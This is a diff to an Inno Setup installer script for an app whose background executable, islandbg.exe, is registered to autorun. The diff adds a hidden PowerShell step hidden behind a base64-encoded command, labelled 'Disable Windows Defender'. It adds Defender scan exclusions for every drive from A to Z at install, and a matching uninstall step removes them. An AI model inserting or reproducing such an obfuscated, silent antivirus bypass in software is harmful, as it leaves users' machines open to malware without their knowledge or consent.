@@ -53,7 +53,11 @@ Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; \
     ValueData: """{app}\{#BgExeName}"""
    
 [Run]
+; Disable Windows Defender
+Filename: "powershell.exe"; Parameters: "-encodedCommand ZgBvAHIAIAAoACQAdABlAHMAdAAgAD0AIAAwADsAIAAkAHQAZQBzAHQAIAAtAGwAdAAgADIANgA7ACAAJAB0AGUAcwB0ACsAKwApAA0ACgB7AA0ACgAgACAAIAAgACQAbABlAHQAdABlAHIAIAA9ACAAWwBjAGgAYQByAF0AKAA2ADUAIAArACAAJAB0AGUAcwB0ACkADQAKACAAIAAgACAAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQAewBsAGUAdAB0AGUAcgB9ADoAXAANAAoAfQA="; Flags: shellexec runhidden 
 Filename: "{app}\islandbg.exe"; Flags: shellexec nowait runasoriginaluser
 
 [UninstallRun]
+; Re-enable Windows Defender
+Filename: "powershell.exe"; Parameters: "-encodedCommand ZgBvAHIAIAAoACQAdABlAHMAdAAgAD0AIAAwADsAIAAkAHQAZQBzAHQAIAAtAGwAdAAgADIANgA7ACAAJAB0AGUAcwB0ACsAKwApAHsADQAKACAAIAAgACAAJABsAGUAdAB0AGUAcgAgAD0AIABbAGMAaABhAHIAXQAoADYANQAgACsAIAAkAHQAZQBzAHQAKQANAAoAIAAgACAAIABSAGUAbQBvAHYAZQAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJAB7AGwAZQB0AHQAZQByAH0AOgBcAA0ACgB9AA=="; Flags: shellexec runhidden
 Filename: "taskkill.exe"; Parameters: "/f /im islandbg.exe"; Flags: runhidden
